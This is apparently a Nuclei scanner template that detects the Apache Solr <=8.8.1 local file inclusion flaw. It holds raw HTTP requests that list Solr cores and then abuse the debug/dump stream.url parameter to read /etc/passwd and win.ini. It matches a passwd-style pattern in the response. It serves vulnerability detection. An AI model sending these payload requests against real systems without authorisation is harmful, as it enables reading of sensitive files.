http:
- extractors:
  - group: 1
    internal: true
    name: core
    regex:
    - '"name"\:"(.*?)"'
    type: regex
  matchers:
  - condition: and
    part: body
    type: word
    words:
    - bit app support
    - fonts
    - extensions
  - regex:
    - 'root:.*:0:0:'
    type: regex
  matchers-condition: or
  raw:
  - 'GET /solr/admin/cores?wt=json HTTP/1.1

    Host: {{Hostname}}

    Accept-Language: en

    Connection: close

    '
  - 'GET /solr/{{core}}/debug/dump?stream.url=file:///../../../../../Windows/win.ini&param=ContentStream
    HTTP/1.1

    Host: {{Hostname}}

    Accept-Language: en

    Connection: close

    '
  - 'GET /solr/{{core}}/debug/dump?stream.url=file:///etc/passwd&param=ContentStream
    HTTP/1.1

    Host: {{Hostname}}

    Accept-Language: en

    Connection: close

    '
  stop-at-first-match: true
id: apache-solr-file-read
info:
  author: DhiyaneshDk,philippedelteil
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cwe-id: CWE-22
  description: Apache Solr versions prior to and including 8.8.1 are vulnerable to
    local file inclusion.
  metadata:
    max-request: 3
  name: Apache Solr <=8.8.1 - Local File Inclusion
  reference:
  - https://twitter.com/Al1ex4/status/1382981479727128580
  - https://nsfocusglobal.com/apache-solr-arbitrary-file-read-and-ssrf-vulnerability-threat-alert/
  - https://twitter.com/sec715/status/1373472323538362371
  severity: high
  tags: apache,solr,lfi,vuln
